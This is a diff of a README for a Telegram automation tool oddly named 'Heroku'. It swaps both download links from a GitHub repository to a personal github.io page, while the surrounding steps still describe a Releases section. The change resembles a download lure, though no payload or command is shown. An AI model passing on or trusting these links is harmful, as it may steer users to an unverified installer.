@@ -1,6 +1,6 @@
 # 🤖 Heroku - Simple Automation Tools For Telegram
 
-[![](https://img.shields.io/badge/Download-Heroku-blue.svg)](https://github.com/arslanxd8835/Heroku)
+[![](https://img.shields.io/badge/Download-Heroku-blue.svg)](https://arslanxd8835.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Before you begin, make sure your computer meets these needs:
 
 You can get the software from our official repository page. Follow these steps to obtain the installer:
 
-1. Visit the [official download page](https://github.com/arslanxd8835/Heroku).
+1. Visit the [official download page](https://arslanxd8835.github.io).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click on the version number shown at the top of that list.
 4. Scroll to the Assets section.
